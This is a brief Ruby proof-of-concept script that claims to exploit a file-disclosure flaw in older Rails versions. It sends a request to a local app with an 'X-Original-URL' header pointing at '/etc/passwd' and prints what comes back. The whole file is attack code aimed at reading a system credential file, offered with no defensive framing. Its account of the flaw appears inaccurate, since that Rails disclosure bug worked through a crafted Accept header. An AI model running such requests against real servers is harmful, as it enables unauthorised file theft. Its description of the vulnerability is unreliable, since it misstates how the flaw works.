# vulnerable.rb
require 'net/http'

# File disclosure via crafted header in vulnerable Rails version (< 5.2.2.1 or 6.0.0.beta2)
uri = URI('http://localhost:3000/users')
req = Net::HTTP::Get.new(uri)
req['X-Original-URL'] = '/etc/passwd'  # malicious header

res = Net::HTTP.start(uri.hostname, uri.port) { |http| http.request(req) }
puts res.body
